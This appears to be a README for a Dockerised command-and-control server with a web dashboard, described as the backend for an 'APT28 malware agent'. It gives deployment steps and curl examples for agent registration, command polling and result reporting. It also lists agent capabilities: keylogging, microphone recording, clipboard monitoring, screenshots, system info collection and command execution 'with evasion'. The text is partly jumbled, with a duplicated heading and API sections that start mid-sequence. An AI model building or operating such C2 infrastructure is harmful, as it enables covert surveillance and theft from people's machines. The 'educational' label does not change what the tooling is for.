# APT28 C2 Server (Docker Deployment)

A Command and Control (C2) server implementation with a React-based web dashboard. This server manages client communication, command distribution, and result collection for the APT28 malware agent.

**Deployment:** Docker-only (recommended for security and isolation)

## Features

- **Web Dashboard**: Modern React-based UI for managing operations
- **Client Registration**: Register and track connected malware clients
- **Command Distribution**: Send capabilities to clients via web interface
- **Result Collection**: View and analyze execution results in real-time
- **Client Management**: Monitor client status and activity
- **REST API**: Complete HTTP API for C2 operations
- **Logging**: Comprehensive logging with persistent volumes
- **Containerized**: Docker-only deployment for security and portability

## Project Structure

```
c2_server/
├── app.py              # Main Flask application
├── cli.py              # CLI management tool
├── requirements.txt    # Python dependencies
├── Dockerfile          # Multi-stage Docker build
├── docker-compose.yml  # Docker Compose configuration
├── frontend/           # React dashboard
│   ├── src/
│   │   ├── App.js
│   │   ├── api.js
│   │   ├── components/
│   │   │   ├── Dashboard.js
│   │   │   ├── Clients.js
│   │   │   ├── Commands.js
│   │   │   └── Results.js
│   │   └── index.css
│   ├── public/
│   └── package.json
├── logs/               # Server logs (created at runtime)
└── README.md           # This file
```

## Quick Start (Docker)

## Quick Start (Docker)

### Prerequisites
- Docker (20.10+)
- Docker Compose (1.29+)

### Build and Run

1. Navigate to the c2_server directory:
```bash
cd /workspaces/APT28/c2_server
```

2. Build and start the server:
```bash
docker-compose up --build
```

3. Access the web dashboard:
```
http://localhost:8080
```

The server will automatically build the React frontend and serve it alongside the API.

### Running in Background

```bash
docker-compose up -d
```

### View Logs

```bash
docker-compose logs -f
```

### Stop the Server

```bash
docker-compose down
```

### Rebuild After Changes

```bash
docker-compose up --build --force-recreate
```

## Web Dashboard

The React-based dashboard provides:

- **Dashboard**: Overview of connected clients, active sessions, and results
- **Clients**: View all registered clients with status and activity
- **Commands**: Send capability commands to specific clients
- **Results**: View and analyze execution results in real-time

Navigate to `http://localhost:8080` after starting the server.

## Configuration

Environment variables can be set in `docker-compose.yml`:

```yaml
environment:
  - C2_HOST=0.0.0.0
  - C2_PORT=8080
  - DEBUG=False
  - FLASK_ENV=production
```

## Persistent Data

The following directories are persisted via Docker volumes:

- `/app/logs` - Server logs (mapped to `./logs`)
- `/app/data` - Application data (Docker volume `c2_data`)
```bash
curl "http://localhost:8080/api/command?id=APT28_1234_1701619200"
```

**Response:**
```
1
```
(Numeric capability ID)

---

### 3. Report Result
**Endpoint:** `POST /api/report`

**Purpose:** Client reports execution result

**Headers:** `Content-Type: application/json`

**Body:**
```json
{
  "id": "APT28_1234_1701619200",
  "capability": 1,
  "result": "executed"
}
```

**Example:**
```bash
curl -X POST http://localhost:8080/api/report \
  -H "Content-Type: application/json" \
  -d '{"id":"APT28_1234_1701619200","capability":1,"result":"executed"}'
```

**Response:**
```json
{
  "status": "received",
  "message": "Report received successfully"
}
```

---

### 4. List Clients
**Endpoint:** `GET /api/clients`

**Purpose:** Get all registered clients

**Example:**
```bash
curl "http://localhost:8080/api/clients"
```

**Response:**
```json
{
  "count": 2,
  "clients": {
    "APT28_1234_1701619200": {
      "id": "APT28_1234_1701619200",
      "registered_at": "2025-12-03T10:30:00",
      "last_seen": "2025-12-03T10:35:45",
      "ip": "192.168.1.100",
      "status": "active"
    }
  }
}
```

---

### 5. List Results
**Endpoint:** `GET /api/results?limit=<limit>`

**Purpose:** Get execution results

## API Endpoints

Access the API at `http://localhost:8080/api/`

For detailed API documentation, see the web dashboard or use:
```bash
curl "http://localhost:8080/api/"
```

### Key Endpoints

| Method | Endpoint | Purpose |
|--------|----------|---------|
| GET | `/api/register?id=<id>` | Register new client |
| GET | `/api/command?id=<id>` | Fetch command for client |
| POST | `/api/report` | Submit execution result |
| POST | `/api/send_command` | Send command to client |
| GET | `/api/clients` | List all clients |
| GET | `/api/results` | List all results |
| GET | `/api/health` | Server health check |

## Capability IDs

| ID | Name | Description |
|---|---|---|
| 0 | No Command | Idle state (default) |
| 1 | Audio Recorder | Record from microphone |
| 2 | Clipboard Monitor | Monitor clipboard |
| 3 | Keylogger | Capture keystrokes |
| 4 | Screenshot | Capture screen |
| 5 | Info Collector | System information |
| 6 | Command Executor | Execute commands with evasion |

## Using the Web Dashboard

1. **Dashboard Tab**: View overview statistics and system information
2. **Clients Tab**: Monitor connected clients and their status
3. **Commands Tab**: Send capability commands to clients
4. **Results Tab**: View execution results in real-time

## CLI Management

Use the CLI tool for advanced operations:

```bash
docker exec -it apt28_c2_server python cli.py --help
```

## Logs

View logs in real-time:

```bash
# Container logs
docker-compose logs -f

# Application logs
docker exec -it apt28_c2_server tail -f /app/logs/c2_server.log
```

## Security Considerations

⚠️ **Warning:** This is a demonstration/educational implementation.

**For production deployment:**

1. **Authentication**: Implement API key authentication
2. **Encryption**: Use HTTPS/TLS (configure reverse proxy)
3. **Network Isolation**: Use Docker networks and firewall rules
4. **Rate Limiting**: Add rate limiting middleware
5. **Database**: Replace in-memory storage with persistent database
6. **Access Control**: Implement RBAC for multi-operator scenarios
7. **Monitoring**: Add intrusion detection and monitoring

## Troubleshooting

### Container won't start
```bash
# Check logs
docker-compose logs

# Rebuild from scratch
docker-compose down -v
docker-compose up --build
```

### Frontend not loading
```bash
# Verify static files were built
docker exec -it apt28_c2_server ls -la /app/static

# Rebuild with no cache
docker-compose build --no-cache
```

### Port already in use
```bash
# Change port in docker-compose.yml
ports:
  - "9090:8080"  # Use port 9090 instead
```

## License

See LICENSE file for details.

## References

- [C2 API Documentation](../C2_API.md)
- [Flask Documentation](https://flask.palletsprojects.com/)
- Original APT28 malware implementation in C
